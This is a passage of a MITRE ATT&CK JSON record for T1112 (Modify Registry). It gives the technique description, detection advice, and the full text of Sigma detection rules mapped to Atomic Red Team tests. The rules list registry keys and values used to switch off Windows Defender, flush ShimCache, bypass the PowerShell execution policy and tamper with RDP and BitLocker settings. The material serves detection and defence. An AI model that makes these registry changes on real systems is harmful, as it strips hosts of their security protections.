{
    "id": "T1112",
    "name": "Modify Registry",
    "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](T1021.002) for RPC communication.",
    "platforms": "Windows",
    "kill_chain_phases": "Defense Evasion",
    "data_sources": "Process: Process Creation, Process: OS API Execution, Command: Command Execution, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification, Windows Registry: Windows Registry Key Deletion",
    "detection": "Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](T1047) and [PowerShell](T1059.001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).",
    "url": "https://attack.mitre.org/techniques/T1112",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "ecbd533e-b45d-4239-aeff-b857c6f6d68b",
                "atomic_attack_name": "Flush Shimcache",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "ShimCache Flush",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_shimcache_flush.yml",
                        "remote_content": "title: ShimCache Flush\nid: b0524451-19af-4efa-a46f-562a977f792e\nstatus: stable\ndescription: Detects actions that clear the local ShimCache and remove forensic evidence\nreferences:\n    - https://medium.com/@blueteamops/shimcache-flush-89daff28d15e\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-02-01\ntags:\n    - attack.defense-evasion\n    - attack.t1112\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1a:\n        CommandLine|contains|all:\n            - 'rundll32'\n            - 'apphelp.dll'\n    selection1b:\n        CommandLine|contains:\n            - 'ShimFlushCache'\n            - '#250'\n    selection2a:\n        CommandLine|contains|all:\n            - 'rundll32'\n            - 'kernel32.dll'\n    selection2b:\n        CommandLine|contains:\n            - 'BaseFlushAppcompatCache'\n            - '#46'\n    condition: ( selection1a and selection1b ) or ( selection2a and selection2b )\nfields:\n    - Image\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Rundll32 Shimcache Flush",
                        "rule_link": "https://research.splunk.com/endpoint/a913718a-25b6-11ec-96d3-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "f3a6cceb-06c9-48e5-8df8-8867a6814245",
                "atomic_attack_name": "Change Powershell Execution Policy to Bypass",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Change PowerShell Policies to an Insecure Level",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_set_policies_to_unsecure_level.yml",
                        "remote_content": "title: Change PowerShell Policies to an Insecure Level\nid: 87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180\nrelated:\n    - id: cf2e938e-9a3e-4fe8-a347-411642b28a9f # ProcCreation Registry\n      type: similar\n    - id: 61d0475c-173f-4844-86f7-f3eebae1c66b # ScriptBlock\n      type: similar\n    - id: fad91067-08c5-4d1a-8d8c-d96a21b37814 # Registry\n      type: similar\nstatus: test\ndescription: Detects changing the PowerShell script execution policy to a potentially insecure level using the \"-ExecutionPolicy\" flag.\nreferences:\n    - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4\n    - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4\n    - https://adsecurity.org/?p=2604\n    - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/\nauthor: frack113\ndate: 2021-11-01\nmodified: 2023-12-13\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n    selection_option:\n        CommandLine|contains:\n            - '-executionpolicy '\n            - ' -ep '\n            - ' -exec '\n    selection_level:\n        CommandLine|contains:\n            - 'Bypass'\n            - 'Unrestricted'\n    condition: all of selection_*\nfalsepositives:\n    - Administrator scripts\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Malicious PowerShell Process - Execution Policy Bypass",
                        "rule_link": "https://research.splunk.com/endpoint/9be56c82-b1cc-4318-87eb-d138afaaca39/"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "02d8b9f7-1a51-4011-8901-2d55cca667f9",
                "atomic_attack_name": "Modify UseTPMKeyPIN Registry entry",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Reg Add BitLocker",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_bitlocker.yml",
                        "remote_content": "title: Suspicious Reg Add BitLocker\nid: 0e0255bf-2548-47b8-9582-c0955c9283f5\nstatus: test\ndescription: Detects suspicious addition to BitLocker related registry keys via the reg.exe utility\nreferences:\n    - https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/\nauthor: frack113\ndate: 2021-11-15\nmodified: 2022-09-09\ntags:\n    - attack.impact\n    - attack.t1486\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'REG'\n            - 'ADD'\n            - '\\SOFTWARE\\Policies\\Microsoft\\FVE'\n            - '/v'\n            - '/f'\n        CommandLine|contains:\n            - 'EnableBDEWithNoTPM'\n            - 'UseAdvancedStartup'\n            - 'UseTPM'\n            - 'UseTPMKey'\n            - 'UseTPMKeyPIN'\n            - 'RecoveryKeyMessageSource'\n            - 'UseTPMPIN'\n            - 'RecoveryKeyMessage'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "c8480c83-a932-446e-a919-06a1fd1e512a",
                "atomic_attack_name": "Modify UseTPMKey Registry entry",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Reg Add BitLocker",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_bitlocker.yml",
                        "remote_content": "title: Suspicious Reg Add BitLocker\nid: 0e0255bf-2548-47b8-9582-c0955c9283f5\nstatus: test\ndescription: Detects suspicious addition to BitLocker related registry keys via the reg.exe utility\nreferences:\n    - https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/\nauthor: frack113\ndate: 2021-11-15\nmodified: 2022-09-09\ntags:\n    - attack.impact\n    - attack.t1486\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'REG'\n            - 'ADD'\n            - '\\SOFTWARE\\Policies\\Microsoft\\FVE'\n            - '/v'\n            - '/f'\n        CommandLine|contains:\n            - 'EnableBDEWithNoTPM'\n            - 'UseAdvancedStartup'\n            - 'UseTPM'\n            - 'UseTPMKey'\n            - 'UseTPMKeyPIN'\n            - 'RecoveryKeyMessageSource'\n            - 'UseTPMPIN'\n            - 'RecoveryKeyMessage'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "10b33fb0-c58b-44cd-8599-b6da5ad6384c",
                "atomic_attack_name": "Modify UseTPMPIN Registry entry",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Reg Add BitLocker",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_bitlocker.yml",
                        "remote_content": "title: Suspicious Reg Add BitLocker\nid: 0e0255bf-2548-47b8-9582-c0955c9283f5\nstatus: test\ndescription: Detects suspicious addition to BitLocker related registry keys via the reg.exe utility\nreferences:\n    - https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/\nauthor: frack113\ndate: 2021-11-15\nmodified: 2022-09-09\ntags:\n    - attack.impact\n    - attack.t1486\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'REG'\n            - 'ADD'\n            - '\\SOFTWARE\\Policies\\Microsoft\\FVE'\n            - '/v'\n            - '/f'\n        CommandLine|contains:\n            - 'EnableBDEWithNoTPM'\n            - 'UseAdvancedStartup'\n            - 'UseTPM'\n            - 'UseTPMKey'\n            - 'UseTPMKeyPIN'\n            - 'RecoveryKeyMessageSource'\n            - 'UseTPMPIN'\n            - 'RecoveryKeyMessage'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "bacb3e73-8161-43a9-8204-a69fe0e4b482",
                "atomic_attack_name": "Modify EnableBDEWithNoTPM Registry entry",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Reg Add BitLocker",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_bitlocker.yml",
                        "remote_content": "title: Suspicious Reg Add BitLocker\nid: 0e0255bf-2548-47b8-9582-c0955c9283f5\nstatus: test\ndescription: Detects suspicious addition to BitLocker related registry keys via the reg.exe utility\nreferences:\n    - https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/\nauthor: frack113\ndate: 2021-11-15\nmodified: 2022-09-09\ntags:\n    - attack.impact\n    - attack.t1486\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'REG'\n            - 'ADD'\n            - '\\SOFTWARE\\Policies\\Microsoft\\FVE'\n            - '/v'\n            - '/f'\n        CommandLine|contains:\n            - 'EnableBDEWithNoTPM'\n            - 'UseAdvancedStartup'\n            - 'UseTPM'\n            - 'UseTPMKey'\n            - 'UseTPMKeyPIN'\n            - 'RecoveryKeyMessageSource'\n            - 'UseTPMPIN'\n            - 'RecoveryKeyMessage'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "26fc7375-a551-4336-90d7-3f2817564304",
                "atomic_attack_name": "Requires the BitLocker PIN for Pre-boot authentication",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Reg Add BitLocker",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_bitlocker.yml",
                        "remote_content": "title: Suspicious Reg Add BitLocker\nid: 0e0255bf-2548-47b8-9582-c0955c9283f5\nstatus: test\ndescription: Detects suspicious addition to BitLocker related registry keys via the reg.exe utility\nreferences:\n    - https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/\nauthor: frack113\ndate: 2021-11-15\nmodified: 2022-09-09\ntags:\n    - attack.impact\n    - attack.t1486\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'REG'\n            - 'ADD'\n            - '\\SOFTWARE\\Policies\\Microsoft\\FVE'\n            - '/v'\n            - '/f'\n        CommandLine|contains:\n            - 'EnableBDEWithNoTPM'\n            - 'UseAdvancedStartup'\n            - 'UseTPM'\n            - 'UseTPMKey'\n            - 'UseTPMKeyPIN'\n            - 'RecoveryKeyMessageSource'\n            - 'UseTPMPIN'\n            - 'RecoveryKeyMessage'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "5f8e36de-37ca-455e-b054-a2584f043c06",
                "atomic_attack_name": "Disable Windows Remote Desktop Protocol",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Potential Tampering With RDP Related Registry Keys Via Reg.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_rdp_keys_tamper.yml",
                        "remote_content": "title: Potential Tampering With RDP Related Registry Keys Via Reg.EXE\nid: 0d5675be-bc88-4172-86d3-1e96a4476536\nstatus: test\ndescription: Detects the execution of \"reg.exe\" for enabling/disabling the RDP service on the host by tampering with the 'CurrentControlSet\\Control\\Terminal Server' values\nreferences:\n    - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\nauthor: pH-T (Nextron Systems), @Kostastsale, @TheDFIRReport\ndate: 2022-02-12\nmodified: 2023-02-05\ntags:\n    - attack.defense-evasion\n    - attack.lateral-movement\n    - attack.t1021.001\n    - attack.t1112\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_main_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_main_cli:\n        CommandLine|contains|all:\n            - ' add '\n            - '\\CurrentControlSet\\Control\\Terminal Server'\n            - 'REG_DWORD'\n            - ' /f'\n    selection_values_1:\n        CommandLine|contains|all:\n            - 'Licensing Core'\n            - 'EnableConcurrentSessions'\n    selection_values_2:\n        CommandLine|contains:\n            - 'WinStations\\RDP-Tcp'\n            - 'MaxInstanceCount'\n            - 'fEnableWinStation'\n            - 'TSUserEnabled'\n            - 'TSEnabled'\n            - 'TSAppCompat'\n            - 'IdleWinStationPoolCount'\n            - 'TSAdvertise'\n            - 'AllowTSConnections'\n            - 'fSingleSessionPerUser'\n            - 'fDenyTSConnections'\n    condition: all of selection_main_* and 1 of selection_values_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "16bdbe52-371c-4ccf-b708-79fba61f1db4",
                "atomic_attack_name": "Enable RDP via Registry (fDenyTSConnections)",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Potential Tampering With RDP Related Registry Keys Via Reg.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_rdp_keys_tamper.yml",
                        "remote_content": "title: Potential Tampering With RDP Related Registry Keys Via Reg.EXE\nid: 0d5675be-bc88-4172-86d3-1e96a4476536\nstatus: test\ndescription: Detects the execution of \"reg.exe\" for enabling/disabling the RDP service on the host by tampering with the 'CurrentControlSet\\Control\\Terminal Server' values\nreferences:\n    - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\nauthor: pH-T (Nextron Systems), @Kostastsale, @TheDFIRReport\ndate: 2022-02-12\nmodified: 2023-02-05\ntags:\n    - attack.defense-evasion\n    - attack.lateral-movement\n    - attack.t1021.001\n    - attack.t1112\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_main_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_main_cli:\n        CommandLine|contains|all:\n            - ' add '\n            - '\\CurrentControlSet\\Control\\Terminal Server'\n            - 'REG_DWORD'\n            - ' /f'\n    selection_values_1:\n        CommandLine|contains|all:\n            - 'Licensing Core'\n            - 'EnableConcurrentSessions'\n    selection_values_2:\n        CommandLine|contains:\n            - 'WinStations\\RDP-Tcp'\n            - 'MaxInstanceCount'\n            - 'fEnableWinStation'\n            - 'TSUserEnabled'\n            - 'TSEnabled'\n            - 'TSAppCompat'\n            - 'IdleWinStationPoolCount'\n            - 'TSAdvertise'\n            - 'AllowTSConnections'\n            - 'fSingleSessionPerUser'\n            - 'fDenyTSConnections'\n    condition: all of selection_main_* and 1 of selection_values_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "ffeddced-bb9f-49c6-97f0-3d07a509bf94",
                "atomic_attack_name": "Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value.",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Reg Add Suspicious Paths",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_susp_paths.yml",
                        "remote_content": "title: Reg Add Suspicious Paths\nid: b7e2a8d4-74bb-4b78-adc9-3f92af2d4829\nstatus: test\ndescription: Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1562.001/T1562.001.md\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2022-10-10\ntags:\n    - attack.defense-evasion\n    - attack.t1112\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_reg:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_path:\n        CommandLine|contains:\n            # Add more suspicious registry locations below\n            - '\\AppDataLow\\Software\\Microsoft\\'\n            - '\\Policies\\Microsoft\\Windows\\OOBE'\n            - '\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon'\n            - '\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'\n            - '\\Microsoft\\Windows Defender\\'\n    condition: all of selection_*\nfalsepositives:\n    - Rare legitimate add to registry via cli (to these locations)\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious Windows Defender Registry Key Tampering Via Reg.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_windows_defender_tamper.yml",
                        "remote_content": "title: Suspicious Windows Defender Registry Key Tampering Via Reg.EXE\nid: 452bce90-6fb0-43cc-97a5-affc283139b3\nstatus: test\ndescription: Detects the usage of \"reg.exe\" to tamper with different Windows Defender registry keys in order to disable some important features related to protection and detection\nreferences:\n    - https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/\n    - https://github.com/swagkarna/Defeat-Defender-V1.2.0\n    - https://www.elevenforum.com/t/video-guide-how-to-completely-disable-microsoft-defender-antivirus.14608/page-2\nauthor: Florian Roth (Nextron Systems), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-03-22\nmodified: 2023-06-05\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_root_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_root_path:\n        CommandLine|contains:\n            - 'SOFTWARE\\Microsoft\\Windows Defender\\'\n            - 'SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center'\n            - 'SOFTWARE\\Policies\\Microsoft\\Windows Defender\\'\n    selection_dword_0:\n        CommandLine|contains|all:\n            - ' add '\n            - 'd 0'\n        CommandLine|contains:\n            - 'DisallowExploitProtectionOverride'\n            - 'EnableControlledFolderAccess'\n            - 'MpEnablePus'\n            - 'PUAProtection'\n            - 'SpynetReporting'\n            - 'SubmitSamplesConsent'\n            - 'TamperProtection'\n    selection_dword_1:\n        CommandLine|contains|all:\n            - ' add '\n            - 'd 1'\n        CommandLine|contains:\n            - 'DisableAntiSpyware'\n            - 'DisableAntiSpywareRealtimeProtection'\n            - 'DisableAntiVirus'\n            - 'DisableArchiveScanning'\n            - 'DisableBehaviorMonitoring'\n            - 'DisableBlockAtFirstSeen'\n            - 'DisableConfig'\n            - 'DisableEnhancedNotifications'\n            - 'DisableIntrusionPreventionSystem'\n            - 'DisableIOAVProtection'\n            - 'DisableOnAccessProtection'\n            - 'DisablePrivacyMode'\n            - 'DisableRealtimeMonitoring'\n            - 'DisableRoutinelyTakingAction'\n            - 'DisableScanOnRealtimeEnable'\n            - 'DisableScriptScanning'\n            - 'Notification_Suppress'\n            - 'SignatureDisableUpdateOnStartupWithoutEngine'\n    condition: all of selection_root_* and 1 of selection_dword_*\nfalsepositives:\n    - Rare legitimate use by administrators to test software (should always be investigated)\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "c88ef166-50fa-40d5-a80c-e2b87d4180f7",
                "atomic_attack_name": "Modify Internet Zone Protocol Defaults in Current User Registry - cmd",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "IE ZoneMap Setting Downgraded To MyComputer Zone For HTTP Protocols Via CLI",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade.yml",
                        "remote_content": "title: IE ZoneMap Setting Downgraded To MyComputer Zone For HTTP Protocols Via CLI\nid: 10344bb3-7f65-46c2-b915-2d00d47be5b0\nrelated:\n    - id: 3fd4c8d7-8362-4557-a8e6-83b29cc0d724\n      type: similar\nstatus: test\ndescription: |\n    Detects changes to Internet Explorer's (IE / Windows Internet properties) ZoneMap configuration of the \"HTTP\" and \"HTTPS\" protocols to point to the \"My Computer\" zone. This allows downloaded files from the Internet to be granted the same level of trust as files stored locally.\nreferences:\n    - https://twitter.com/M_haggis/status/1699056847154725107\n    - https://twitter.com/JAMESWT_MHT/status/1699042827261391247\n    - https://learn.microsoft.com/en-us/troubleshoot/developer/browsers/security-privacy/ie-security-zones-registry-entries\n    - https://www.virustotal.com/gui/file/339ff720c74dc44265b917b6d3e3ba0411d61f3cd3c328e9a2bae81592c8a6e5/content\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-09-05\ntags:\n    - attack.execution\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults'\n            - 'http'\n            - ' 0'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "3b625eaa-c10d-4635-af96-3eae7d2a2f3c",
                "atomic_attack_name": "Tamper Win Defender Protection",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Reg Add Suspicious Paths",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_susp_paths.yml",
                        "remote_content": "title: Reg Add Suspicious Paths\nid: b7e2a8d4-74bb-4b78-adc9-3f92af2d4829\nstatus: test\ndescription: Detects when an adversary uses the reg.exe utility to add or modify new keys or subkeys\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1112/T1112.md\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1562.001/T1562.001.md\n    - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\nmodified: 2022-10-10\ntags:\n    - attack.defense-evasion\n    - attack.t1112\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_reg:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_path:\n        CommandLine|contains:\n            # Add more suspicious registry locations below\n            - '\\AppDataLow\\Software\\Microsoft\\'\n            - '\\Policies\\Microsoft\\Windows\\OOBE'\n            - '\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'\n            - '\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon'\n            - '\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'\n            - '\\Microsoft\\Windows Defender\\'\n    condition: all of selection_*\nfalsepositives:\n    - Rare legitimate add to registry via cli (to these locations)\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious Windows Defender Registry Key Tampering Via Reg.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_windows_defender_tamper.yml",
                        "remote_content": "title: Suspicious Windows Defender Registry Key Tampering Via Reg.EXE\nid: 452bce90-6fb0-43cc-97a5-affc283139b3\nstatus: test\ndescription: Detects the usage of \"reg.exe\" to tamper with different Windows Defender registry keys in order to disable some important features related to protection and detection\nreferences:\n    - https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/\n    - https://github.com/swagkarna/Defeat-Defender-V1.2.0\n    - https://www.elevenforum.com/t/video-guide-how-to-completely-disable-microsoft-defender-antivirus.14608/page-2\nauthor: Florian Roth (Nextron Systems), Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-03-22\nmodified: 2023-06-05\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_root_img:\n        - Image|endswith: '\\reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_root_path:\n        CommandLine|contains:\n            - 'SOFTWARE\\Microsoft\\Windows Defender\\'\n            - 'SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center'\n            - 'SOFTWARE\\Policies\\Microsoft\\Windows Defender\\'\n    selection_dword_0:\n        CommandLine|contains|all:\n            - ' add '\n            - 'd 0'\n        CommandLine|contains:\n            - 'DisallowExploitProtectionOverride'\n            - 'EnableControlledFolderAccess'\n            - 'MpEnablePus'\n            - 'PUAProtection'\n            - 'SpynetReporting'\n            - 'SubmitSamplesConsent'\n            - 'TamperProtection'\n    selection_dword_1:\n        CommandLine|contains|all:\n            - ' add '\n            - 'd 1'\n        CommandLine|contains:\n            - 'DisableAntiSpyware'\n            - 'DisableAntiSpywareRealtimeProtection'\n            - 'DisableAntiVirus'\n            - 'DisableArchiveScanning'\n            - 'DisableBehaviorMonitoring'\n            - 'DisableBlockAtFirstSeen'\n            - 'DisableConfig'\n            - 'DisableEnhancedNotifications'\n            - 'DisableIntrusionPreventionSystem'\n            - 'DisableIOAVProtection'\n            - 'DisableOnAccessProtection'\n            - 'DisablePrivacyMode'\n            - 'DisableRealtimeMonitoring'\n            - 'DisableRoutinelyTakingAction'\n            - 'DisableScanOnRealtimeEnable'\n            - 'DisableScriptScanning'\n            - 'Notification_Suppress'\n            - 'SignatureDisableUpdateOnStartupWithoutEngine'\n    condition: all of selection_root_* and 1 of selection_dword_*\nfalsepositives:\n    - Rare legitimate use by administrators to test software (should always be investigated)\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1112",
                "atomic_attack_guid": "e3ad8e83-3089-49ff-817f-e52f8c948090",
                "atomic_attack_name": "Enabling Remote Desktop Protocol via Remote Registry",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Potential Tampering With RDP Related Registry Keys Via Reg.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_rdp_keys_tamper.yml",
